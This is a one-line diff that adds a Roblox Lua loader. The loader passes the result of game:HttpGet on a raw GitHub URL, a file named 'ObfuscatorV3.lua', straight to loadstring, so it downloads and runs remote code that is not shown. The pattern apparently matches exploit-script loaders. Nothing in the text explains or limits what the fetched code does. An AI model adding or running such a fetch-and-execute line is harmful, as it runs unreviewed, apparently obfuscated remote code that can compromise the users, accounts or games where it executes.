@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/railme37509124/TestOBFS/main/ObfuscatorV3.lua", true))()
